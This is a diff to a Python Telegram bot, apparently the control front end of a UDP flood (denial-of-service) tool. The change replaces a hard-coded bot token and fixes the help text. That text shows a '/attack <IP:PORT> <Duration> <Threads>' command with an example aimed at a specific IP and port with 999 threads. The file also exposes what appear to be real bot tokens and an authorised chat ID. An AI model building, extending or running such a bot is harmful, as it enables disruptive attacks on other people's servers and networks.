@@ -3,7 +3,7 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 import subprocess
 
 # Token del bot (obtén el token de @BotFather en Telegram)
-TOKEN = "7593972470:AAHYacOqAwvUsaDC2HhyzRa4El_LuXzEc3I"
+TOKEN = "7852580657:AAEXo_cAGjiCO3NW6SSGHMrod0K3nfpE7WQ"
 
 # Lista de chats autorizados
 allowed_chats = ['-1002362295139']  # Reemplaza con los IDs de los chats autorizados
@@ -19,7 +19,7 @@ async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Verifica que el usuario haya ingresado los parámetros necesarios
     if len(context.args) < 3:
         await update.message.reply_text(
-            "👑 Created By LitDarKrx 👑\n\n⚙️Example: /attack <IP:PORT> <Duration> <Threads>\✅ Send To Activate: /attack 143.92.114.176:10015 53 999 "
+            "👑 Created By LitDarKrx 👑\n\n⚙️Example: /attack <IP:PORT> <Duration> <Threads>\n✅ Send To Activate: /attack 143.92.114.176:10015 53 999 "
         )
         return
 
